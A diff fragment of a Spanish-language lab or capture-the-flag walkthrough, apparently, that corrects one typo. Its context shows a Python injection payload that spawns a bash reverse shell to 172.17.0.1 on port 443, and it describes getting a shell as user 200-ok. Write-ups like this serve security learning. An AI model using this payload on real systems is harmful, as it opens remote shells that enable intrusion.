@@ -98,7 +98,7 @@ lo modificamos para una reverse shell para verificar:
 
          __import__('os').popen("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'").read()
 
-olocamos el puerto en escucha y estamos dentro del usuario 200-ok
+colocamos el puerto en escucha y estamos dentro del usuario 200-ok
 
 ![image](https://github.com/user-attachments/assets/ad34b515-d69e-4277-a76c-0c78e57d873c)
 
